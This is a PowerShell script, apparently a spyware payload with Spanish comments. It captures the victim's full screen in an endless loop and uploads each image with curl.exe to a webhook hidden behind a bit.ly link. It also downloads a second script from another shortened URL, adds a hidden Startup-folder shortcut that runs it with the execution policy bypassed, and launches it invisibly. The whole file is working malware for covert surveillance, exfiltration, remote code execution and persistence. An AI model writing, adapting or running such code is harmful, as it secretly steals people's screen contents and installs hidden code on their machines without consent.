$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas
$a = 0 # Contador de imágenes enviadas al webhook
$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script

# Detección de URL acortada
if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!22..." ; $hookurl = (irm $hookurl).url}

# Verificar si el archivo principal ya existe
$syswPath = "$env:USERPROFILE\sysw.ps1"
if (!(Test-Path $syswPath)) {
    # Descargar el script principal
    $syswUrl = "https://bit.ly/Screen_dc"
    Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
}

do {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $filett
    Start-Sleep $seconds

    # Incrementar contador de imágenes enviadas al webhook
    $a++

    # Verificar si se ha alcanzado la cantidad máxima de imágenes
    if ($a -eq $maxImages) {
        # Crear acceso directo en la carpeta de inicio del usuario
        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutLocation)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
        $shortcut.Save()
        
        # Ejecutar el script principal de manera oculta
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
        
        # Reiniciar contador de imágenes
        $a = 0
    }
} while ($true)